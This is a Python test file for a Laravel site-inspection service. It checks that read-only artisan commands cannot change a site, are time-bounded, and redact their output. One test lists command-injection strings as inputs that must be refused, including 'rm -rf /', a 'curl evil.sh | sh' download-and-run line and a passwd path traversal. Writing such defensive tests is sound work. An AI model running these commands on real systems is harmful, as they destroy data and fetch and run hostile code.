"""Looking at a Laravel site, as opposed to operating it.

Until now we shipped only the WRITING half: we could run migrations but not show which were
pending, restart the queue but not show what had failed. That is backwards for
troubleshooting, which is what somebody opens the screen to do.

**The guarantee that makes these safe is that not one of them changes anything**, and it is
asserted rather than intended — a read and a write in one list is one typo away from a
"look at this" button that alters a live site.
"""
import pytest

from app.services import laravel_service as ls


# ── Nothing here changes anything ────────────────────────────────────────────

@pytest.mark.parametrize("key", list(ls.READS))
def test_no_read_can_change_the_site(key):
    """The whole reason reads live in their own map. If this ever fails, something that
    mutates has been given a read's label."""
    cmd = ls.READS[key]["cmd"]
    for verb in ls._MUTATING:
        assert verb not in cmd, f"{key} runs '{verb.strip()}', which changes the site"


def test_the_mutation_guard_would_actually_catch_one():
    """A check that cannot fail is not a check: prove the list of forbidden verbs matches
    the real commands we already know are writes."""
    for action_cmd in ("migrate --force --no-ansi", "optimize:clear --no-ansi",
                       "queue:restart --no-ansi", "storage:link --no-ansi"):
        assert any(v in action_cmd for v in ls._MUTATING), action_cmd


def test_reads_and_writes_are_separate_lists():
    assert not (set(ls.READS) & set(ls.ACTIONS))


def test_every_read_is_bounded():
    """An unbounded artisan call on a sick site hangs the request. Every one carries its own
    timeout, and the generated command actually uses it."""
    for key, spec in ls.READS.items():
        assert 0 < spec["timeout"] <= 300, key
        cmd = ls.build_read_command(key, "/var/www/x/public")
        assert f"_t {spec['timeout']} $ART" in cmd, key


# ── The caller picks a key, never a command ──────────────────────────────────

def test_an_unknown_read_is_refused_and_names_the_real_ones():
    with pytest.raises(ls.LaravelError) as exc:
        ls.build_read_command("tinker", "/var/www/x")
    msg = str(exc.value)
    for key in ls.READS:
        assert key in msg


@pytest.mark.parametrize("attack", [
    "about; rm -rf /", "about && curl evil.sh | sh", "../../etc/passwd", "about\nrm -rf /",
])
def test_a_command_cannot_be_smuggled_through_the_key(attack):
    """The key indexes a map. There is no path by which caller text becomes a command."""
    with pytest.raises(ls.LaravelError):
        ls.build_read_command(attack, "/var/www/x")


# ── What each one is for ─────────────────────────────────────────────────────

def test_the_six_reads_are_the_ones_ploi_surfaces():
    assert set(ls.READS) == {"about", "migrate_status", "route_list", "schedule_list",
                             "queue_failed", "env"}


def test_each_read_says_what_it_is_for_in_plain_words():
    """A list of artisan command names helps somebody who already knows artisan — which is
    not who this product is for."""
    for key, spec in ls.READS.items():
        assert spec["label"] and spec["blurb"], key
        assert "artisan" not in spec["blurb"].lower(), key
        assert spec["blurb"].endswith("."), key


def test_migrations_can_now_be_looked_at_as_well_as_run():
    """The asymmetry this closes: `migrate` was offered, `migrate:status` was not."""
    assert "migrate" in ls.ACTIONS
    assert "migrate:status" in ls.READS["migrate_status"]["cmd"]


def test_the_queue_can_be_inspected_as_well_as_restarted():
    assert "queue_restart" in ls.ACTIONS
    assert "queue:failed" in ls.READS["queue_failed"]["cmd"]


# ── The output ───────────────────────────────────────────────────────────────

def test_long_output_is_trimmed_rather_than_streamed():
    """A site with 900 routes would otherwise put a megabyte through the socket to answer
    "what URLs does this have"."""
    assert 0 < ls._MAX_OUTPUT <= 200_000


def test_the_command_runs_from_the_application_and_not_the_served_folder():
    """Laravel keeps `artisan` one level above `public/`, so a command run in the served
    folder finds nothing to run."""
    cmd = ls.build_read_command("about", "/var/www/shop.com/public")
    assert "/var/www/shop.com/public" in cmd     # the prelude is told the doc root…
    assert "$ART" in cmd                          # …and resolves artisan from it


def test_a_failing_read_still_shows_what_artisan_said():
    """`queue:failed` on a site with no failed-jobs table exits non-zero, and the reason
    artisan gives is the useful part — hiding it leaves the customer with nothing."""
    import inspect

    src = inspect.getsource(ls.read_one)
    assert '"ok": code == 0' in src
    assert '"output": text' in src


def test_the_output_is_redacted_before_it_leaves_the_server():
    """`about` prints a configuration summary, and on a customised site that can include
    more than driver names. The browser is not the place to find that out."""
    import inspect

    src = inspect.getsource(ls.read_one)
    assert "redact_secrets" in src

    # There is an earlier return — the error path — and it is safe precisely because it
    # carries no output at all. Every return that DOES carry the server's text must come
    # after the redaction, which is the property worth asserting; my first version compared
    # against the first `return` it found and failed on that harmless one.
    before, _, after = src.partition("redact_secrets(output")
    assert '"output": ""' in before, "the only return before redaction must carry no output"
    assert '"output": text' in after, "the redacted text is what gets returned"
    assert "output.strip()" not in after.split("return {")[-1], (
        "raw output must not reach the response")


# ── Finding PHP ──────────────────────────────────────────────────────────────

def test_php_is_looked_for_where_it_actually_lives():
    """Found by running the reads against a real Laravel: the candidate list covered
    CyberPanel's lsphp and /usr/bin, but not /usr/local/bin — the default prefix when PHP is
    built from source, and where the official images put it. A machine with PHP there
    reported "we could not find PHP" and every Laravel action failed on it.

    Widening the search is safe because each candidate is still proved by `artisan --version`
    before it is used, so more places to look can never mean a worse choice.
    """
    cmd = ls.build_read_command("about", "/var/www/x/public")
    for layout, path in (
        ("CyberPanel", "/usr/local/lsws/lsphp*/bin/php"),
        ("distro, versioned", "/usr/bin/php8*"),
        ("distro, default", "/usr/bin/php"),
        ("built from source", "/usr/local/bin/php"),
    ):
        assert path in cmd, f"PHP is not looked for in the {layout} location"
    assert "command -v php" in cmd, "there is no last-resort fallback to PATH"


def test_a_candidate_is_only_used_if_it_can_boot_the_application():
    """The reason widening the search is safe. A PHP that cannot run `artisan --version`
    cannot run the commands either — on a real CyberPanel box /usr/bin/php is 8.3 while the
    site needs 8.4, and Composer's platform check aborts everything with a fatal."""
    cmd = ls.build_read_command("about", "/var/www/x/public")
    assert 'artisan" --version' in cmd
